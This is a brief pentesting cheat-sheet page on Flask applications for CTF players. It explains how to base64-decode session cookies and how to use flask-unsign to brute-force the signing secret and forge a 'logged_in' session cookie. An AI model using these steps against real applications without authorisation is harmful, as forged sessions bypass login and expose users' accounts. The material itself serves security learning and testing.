# Flask

**Probably if you are playing a CTF a Flask application will be related to** [**SSTI**](../../pentesting-web/ssti-server-side-template-injection.md)**.**

## Cookies

Default cookie session name is **`session`**.

### Decoder

Online Flask coockies decoder: [https://www.kirsle.net/wizards/flask-session.cgi](https://www.kirsle.net/wizards/flask-session.cgi)

#### Manual

Get the first part of the cookie until the first point and Base64 decode it&gt;

```bash
echo "ImhlbGxvIg" | base64 -d
```

The cookie is also signed using a password

###  **Flask-Unsign**

Command line tool to fetch, decode, brute-force and craft session cookies of a Flask application by guessing secret keys.

{% embed url="https://pypi.org/project/flask-unsign/" %}

```bash
pip3 install flask-unsign
```

#### **Decode Cookie**

```bash
flask-unsign --decode --cookie 'eyJsb2dnZWRfaW4iOmZhbHNlfQ.XDuWxQ.E2Pyb6x3w-NODuflHoGnZOEpbH8'
```

#### **Brute Force**

```bash
flask-unsign --unsign --cookie < cookie.txt
```

#### **Signing**

```bash
flask-unsign --sign --cookie "{'logged_in': True}" --secret 'CHANGEME'
```

#### Signing using legacy \(old versions\)

```bash
flask-unsign --sign --cookie "{'logged_in': True}" --secret 'CHANGEME' --legacy
```

#### 

